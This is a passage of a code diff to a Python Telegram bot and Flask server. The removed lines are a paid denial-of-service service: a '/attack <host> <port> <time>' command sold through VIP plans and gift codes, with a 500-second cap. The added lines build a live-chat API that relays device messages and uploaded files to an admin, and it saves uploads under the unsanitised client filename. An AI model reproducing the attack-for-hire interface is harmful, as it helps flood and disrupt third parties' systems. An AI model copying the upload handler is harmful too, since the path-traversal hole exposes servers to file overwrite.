-            response = f"GIFT CODE REDEEMED: GRANTED ACCESS FOR {duration.upper()} 🎁."
-        else:
-            response = "INVALID OR EXPIRED GIFT CODE ❌."
-    else:
-        response = "USAGE: /redeem <code>"
-    bot.send_message(message.chat.id, response)
-
-@bot.message_handler(func=lambda message: message.text and message.text.startswith('/attack'))
-def handle_attack(message):
-    user_id = str(message.chat.id)
-    if not is_user_allowed(user_id):
-        bot.send_message(message.chat.id, "🚫 UNAUTHORIZED ACCESS! KRIPYA '💎 BUY VIP' SE PLAN LEIN.")
-        return
-
-    command = message.text.split()
-    if len(command) == 4:
-        target = command[1]
-        try:
-            port = int(command[2])
-            attack_time = int(command[3])
-        except ValueError:
-            bot.reply_to(message, "INVALID PORT OR TIME FORMAT.")
-            return
-
-        if attack_time > 500:
-            bot.reply_to(message, "❌ MAX ATTACK TIME LIMIT IS 500 SECONDS.")
-            return
-
-        try_start_attack(message.chat.id, user_id, target, port, attack_time)
-    else:
-        response = "PLEASE PROVIDE ATTACK FORMAT:\n`/attack <host> <port> <time>` OR USE THE **⚡ QUICK ATTACK** BUTTON."
-        bot.send_message(message.chat.id, response, parse_mode="Markdown")
-
-# ============================================================
-# RUN BOT & FLASK SERVER CONCURRENTLY
-# ============================================================
-
-def run_telegram_bot():
-    print("Telegram Bot polling started...")
-    while True:
-        try:
-            bot.infinity_polling(timeout=60, long_polling_timeout=60)
+            bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
         except Exception as e:
-            print(f"Bot polling error: {e}")
-            time.sleep(5)
+            print("Error sending chat to admin:", e)
 
-if __name__ == "__main__":
-    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
-    bot_thread.start()
+    return jsonify({"status": "success"})
 
+
+@app.route('/api/send_media', methods=['POST'])
+def send_media():
+    try:
+        device_id = request.form.get("device_id")
+        file = request.files.get("file")
+
+        if not device_id or not file:
+            return jsonify({"error": "Missing fields"}), 400
+
+        file_path = os.path.join(UPLOAD_FOLDER, file.filename)
+        file.save(file_path)
+        media_url = f"{RENDER_EXTERNAL_URL}/{file_path}"
+
+        chat_doc = {
+            "device_id": device_id,
+            "sender": "user",
+            "message": "[Media File]",
+            "media_url": media_url,
+            "timestamp": time.time()
+        }
+        chats_collection.insert_one(chat_doc)
+
+        broadcast_message(device_id, {
+            "sender": "user",
+            "message": "[Media File]",
+            "media_url": media_url
+        })
+
+        try:
+            with open(file_path, 'rb') as f:
+                bot.send_document(
+                    ADMIN_ID,
+                    f,
+                    caption=f"📎 Media from Device: `{device_id}`",
+                    parse_mode="Markdown"
+                )
+        except Exception as e:
+            print("Error sending media to telegram:", e)
+
+        return jsonify({"status": "success", "url": media_url})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/stream/<device_id>')
+def stream(device_id):
+    q = queue.Queue()
+    with queues_lock:
+        if device_id not in client_queues:
+            client_queues[device_id] = []
+        client_queues[device_id].append(q)
+
+    def event_stream():
+        try:
+            while True:
+                msg_data = q.get()
+                yield f"data: {msg_data}\n\n"
+        except GeneratorExit:
+            with queues_lock:
+                if device_id in client_queues and q in client_queues[device_id]:
+                    client_queues[device_id].remove(q)
+
+    return Response(event_stream(), mimetype="text/event-stream")
+
+
+@app.route('/api/get_chat/<device_id>', methods=['GET'])
+def get_chat(device_id):
+    messages = list(
+        chats_collection.find({"device_id": device_id}, {"_id": 0})
+        .sort("timestamp", ASCENDING)
+    )
+    formatted = []
+    for m in messages:
+        formatted.append({
+            "sender": m.get("sender", "user"),
+            "message": m.get("message", ""),
+            "media_url": m.get("media_url", "")
+        })
+    return jsonify(formatted)
+
+
+def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
+
+
+# ============================================================
+# START BOT & SERVER
+# ============================================================
+
+if __name__ == "__main__":
+    setup_bot_commands()
+
+    threading.Thread(
+        target=run_flask,
+        daemon=True
+    ).start()
+
+    try:
+        bot.remove_webhook()
+        bot.delete_webhook(drop_pending_updates=True)
+    except Exception as e:
+        print(f"Webhook cleanup error: {e}")
+
+    print("Bot and Flask API Server are running with MongoDB, SSE Streaming & Live Chat Support...")
+
+    bot.infinity_polling(
+        timeout=60,
+        long_polling_timeout=60
+    )
